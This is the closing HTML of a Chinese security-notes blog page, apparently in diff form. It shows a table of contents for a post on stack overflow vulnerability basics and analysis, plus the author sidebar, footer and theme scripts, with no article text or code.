+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E5%9F%BA%E7%A1%80"><span class="nav-number">1.1.</span> <span class="nav-text">寄存器基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%AF%84%E5%AD%98%E5%99%A8-%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">数据寄存器(通用寄存器)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E5%9D%80%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.1.2.</span> <span class="nav-text">变址寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.1.3.</span> <span class="nav-text">指针寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.1.4.</span> <span class="nav-text">段寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E6%8C%87%E9%92%88%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.1.5.</span> <span class="nav-text">指令指针寄存器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E5%9F%BA%E7%A1%80"><span class="nav-number">1.2.</span> <span class="nav-text">栈基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E4%B8%8E%E5%87%BD%E6%95%B0%E6%A0%88"><span class="nav-number">1.2.1.</span> <span class="nav-text">函数与函数栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="nav-number">1.2.2.</span> <span class="nav-text">栈帧结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0"><span class="nav-number">1.2.3.</span> <span class="nav-text">函数传递参数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">栈溢出漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-number">2.1.</span> <span class="nav-text">栈溢出产生的原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-number">2.2.</span> <span class="nav-text">栈溢出的危害</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">栈溢出漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.2.</span> <span class="nav-text">实验步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">调试分析</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'true';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
